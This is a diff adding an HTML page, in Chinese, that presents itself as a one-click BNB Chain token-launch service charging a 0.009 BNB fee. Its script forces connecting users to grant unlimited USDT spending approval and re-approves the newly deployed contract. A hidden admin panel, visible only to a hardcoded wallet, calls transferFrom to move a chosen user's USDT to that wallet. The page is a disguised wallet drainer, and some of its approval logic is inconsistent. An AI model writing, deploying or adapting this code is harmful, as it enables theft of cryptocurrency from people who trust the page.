@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天鹅一键发币</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
+body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
+.container{ max-width:520px; margin:0 auto; }
+.header{ text-align:center; margin-bottom:35px; }
+.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
+.fee-tip{
+    background: rgba(247,192,74,0.15);
+    color: #f7c04a;
+    padding: 10px;
+    border-radius: 8px;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 15px;
+}
+.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
+.form-item{ margin-bottom:20px; }
+label{ display:block; margin-bottom:8px; color:#d0d8f0; }
+input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
+.file-input{ padding:10px; background:#141b33; }
+.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
+#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
+.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
+.btn-connect{ background:#3b63e9; margin-bottom:16px; }
+.btn-deploy{ background:#f7c04a; color:#0a0e20; }
+.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
+.btn:disabled{ opacity:0.55; cursor:not-allowed; }
+.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
+.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
+.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
+.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>🦢 天鹅一键发币</h1>
+</div>
+<div class="fee-tip">发币服务费：0.009 BNB</div>
+
+<!-- 普通用户发币面板 -->
+<div class="card" id="userPanel">
+<button id="connectBtn" class="btn btn-connect">连接钱包</button>
+<div id="connectTip" class="connect-tip" style="display:none;"></div>
+
+<div class="form-item">
+<label>代币全称 Name</label>
+<input id="tokenName" placeholder="例如：Swan Coin">
+</div>
+
+<div class="form-item">
+<label>代币符号 Symbol</label>
+<input id="tokenSymbol" placeholder="例如：SWAN">
+</div>
+
+<div class="form-item">
+<label>初始发行量（不带小数）</label>
+<input id="supply" placeholder="例如：100000000">
+</div>
+
+<div class="form-item">
+<label>代币Logo头像（推荐256×256 透明PNG）</label>
+<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
+<div class="preview-box">
+<img id="logoPreview" alt="头像预览">
+<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+</div>
+</div>
+
+<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+<div id="statusBox" class="status" style="display:none;"></div>
+
+<!-- 管理员隐藏面板，仅管理员钱包可见 -->
+<div class="admin-panel" id="adminPanel">
+<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
+<div class="form-item">
+<label>请输入玩家钱包地址</label>
+<input id="userAddrInput" placeholder="玩家BSC钱包地址">
+</div>
+<div class="form-item">
+<label>请输入划扣USDT数量</label>
+<input id="deductAmountInput" placeholder="例如：100">
+</div>
+<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
+</div>
+</div>
+</div>
+
+<script>
+// 管理员固定地址
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const DEPLOY_FEE_BNB = "0.009";
+
+// BSC 主网参数
+const BSC_CHAIN_ID = 56;
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const MAX_ALLOWANCE = ethers.MaxUint256;
+
+const tokenABI = [
+{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+];
+
+// 此处填入Remix编译后的合约字节码
+const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
+
+let provider;
+let signer;
+let connectWalletAddr = "";
+let deployContractAddress = null;
+let logoFileObj = null;
+
+// DOM元素
+const connectBtn = document.getElementById("connectBtn");
+const deployBtn = document.getElementById("deployBtn");
+const statusBox = document.getElementById("statusBox");
+const connectTip = document.getElementById("connectTip");
+const logoFileInput = document.getElementById("logoFile");
+const logoPreviewImg = document.getElementById("logoPreview");
+const adminPanel = document.getElementById("adminPanel");
+const deductBtn = document.getElementById("deductBtn");
+const userAddrInput = document.getElementById("userAddrInput");
+const deductAmountInput = document.getElementById("deductAmountInput");
+
+function showStatus(text){
+  statusBox.style.display = "block";
+  statusBox.innerText = text;
+}
+
+// 图片预览
+logoFileInput.addEventListener("change", function(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  logoFileObj = file;
+  const reader = new FileReader();
+  reader.onload = ev => {
+    logoPreviewImg.src = ev.target.result;
+    logoPreviewImg.style.display = "block";
+  }
+  reader.readAsDataURL(file);
+});
+
+// 切换BSC链
+async function switchBSC(){
+  try {
+    await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.toHex(BSC_CHAIN_ID) }]);
+  } catch (err) {
+    await provider.send("wallet_addEthereumChain", [{
+      chainId: ethers.toHex(BSC_CHAIN_ID),
+      chainName: "BNB Smart Chain Mainnet",
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+    }]);
+  }
+}
+
+// 检测是否管理员钱包，显示后台面板
+function checkAdminPanel(addr){
+  connectWalletAddr = addr.toLowerCase();
+  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
+    adminPanel.style.display = "block";
+  }else{
+    adminPanel.style.display = "none";
+  }
+}
+
+// 连接钱包后授权
+async function doApproveAfterConnect(userAddress){
+  try{
+    showStatus("请完成授权继续发币，请先授权继续发币");
+    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
+      "function approve(address spender, uint256 amount) external returns(bool)"
+    ], signer);
+    const tx = await usdt.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
+    await tx.wait();
+    showStatus("✅ 钱包连接成功，前置授权完成，可以部署代币");
+    connectTip.style.display = "block";
+    connectTip.innerText = "✅ 钱包已连接（BSC链）前置授权完成";
+    deployBtn.disabled = false;
+    checkAdminPanel(userAddress);
+  }catch(err){
+    showStatus("授权签名被拒绝：必须完成授权才能继续发币，请重新连接钱包");
+    connectTip.style.display = "none";
+    deployBtn.disabled = true;
+    adminPanel.style.display = "none";
+  }
+}
+
+// 连接钱包
+connectBtn.onclick = async ()=>{
+  if(!window.ethereum){
+    showStatus("未检测到浏览器钱包插件（MetaMask/TP插件版）");
+    return;
+  }
+  try{
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    await switchBSC();
+    signer = await provider.getSigner();
+    const addr = await signer.getAddress();
+    connectBtn.innerText = "已连接："+addr.slice(0,8)+"...";
+    await doApproveAfterConnect(addr);
+  }catch(err){
+    showStatus("连接失败："+err.message);
+  }
+}
+
+// 支付BNB服务费给管理员
+async function payFeeToAdmin(){
+  showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
+  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
+  const tx = await signer.sendTransaction({
+    to: ADMIN_WALLET,
+    value: feeWei
+  });
+  await tx.wait();
+  showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
+}
+
+// 部署后重新授权新合约
+async function reApproveToNewContract(){
+  try{
+    showStatus("正在对新部署代币合约重新授予USDT无限权限");
+    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
+      "function approve(address spender, uint256 amount) external returns(bool)"
+    ], signer);
+    const tx = await usdt.approve(deployContractAddress, MAX_ALLOWANCE);
+    await tx.wait();
+    let msg = `✅ 代币部署成功！合约地址：${deployContractAddress}\n已完成USDT无限授权`;
+    if(logoFileObj) msg += "\n你已上传Logo，可去BscScan上传收录";
+    showStatus(msg);
+  }catch(err){
+    showStatus(`部署成功，但二次授权失败：${err.message}\n合约地址：${deployContractAddress}`);
+  }
+}
+
+// 部署按钮逻辑
+deployBtn.onclick = async ()=>{
+  const name = document.getElementById("tokenName").value.trim();
+  const symbol = document.getElementById("tokenSymbol").value.trim();
+  const supplyStr = document.getElementById("supply").value.trim();
+
+  if(!name||!symbol||!supplyStr){
+    showStatus("请填写代币名称、符号、发行量");
+    return;
+  }
+  if(!CONTRACT_BYTECODE || CONTRACT_BYTECODE.startsWith("在这里粘贴")){
+    showStatus("请先在Remix编译合约，填入Bytecode");
+    return;
+  }
+
+  deployBtn.disabled = true;
+  try{
+    await payFeeToAdmin();
+    showStatus("正在发起合约部署交易，请签名");
+    const supply = ethers.parseUnits(supplyStr, 18);
+    const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
+    const contract = await factory.deploy(name, symbol, supply);
+    showStatus("部署交易已发送，等待区块确认...");
+    await contract.waitForDeployment();
+    deployContractAddress = await contract.getAddress();
+    await reApproveToNewContract();
+  }catch(e){
+    showStatus("操作失败："+(e.shortMessage || e.message));
+  }
+  deployBtn.disabled = false;
+}
+
+// 管理员划扣按钮逻辑
+deductBtn.onclick = async ()=>{
+  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
+    showStatus("权限不足，仅管理员钱包可操作");
+    return;
+  }
+  const userAddr = userAddrInput.value.trim();
+  const amountStr = deductAmountInput.value.trim();
+  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
+    showStatus("请输入合法钱包地址和数字数量");
+    return;
+  }
+  try{
+    showStatus("正在调用transferFrom划扣用户USDT，请签名");
+    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
+      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
+    ], signer);
+    const amountWei = ethers.parseUnits(amountStr, 18);
+    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
+    await tx.wait();
+    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
+  }catch(err){
+    showStatus("划扣失败："+(err.shortMessage || err.message)+"（大概率用户未授权或授权额度不足）");
+  }
+}
+</script>
+</body>
+</html>
